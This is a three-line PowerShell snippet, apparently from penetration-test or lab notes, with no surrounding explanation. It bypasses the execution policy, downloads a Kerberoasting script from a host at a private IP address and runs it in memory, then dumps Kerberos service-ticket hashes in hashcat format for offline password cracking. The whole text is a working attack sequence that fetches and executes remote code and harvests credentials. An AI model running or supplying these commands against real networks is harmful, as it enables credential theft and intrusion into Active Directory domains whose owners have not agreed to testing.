powershell -ep bypass;
iex(New-Object Net.WebClient).DownloadString('http://10.50.56.216:80/Invoke-Kerberoast.ps1') 
Invoke-Kerberoast -OutputFormat hashcat |fl

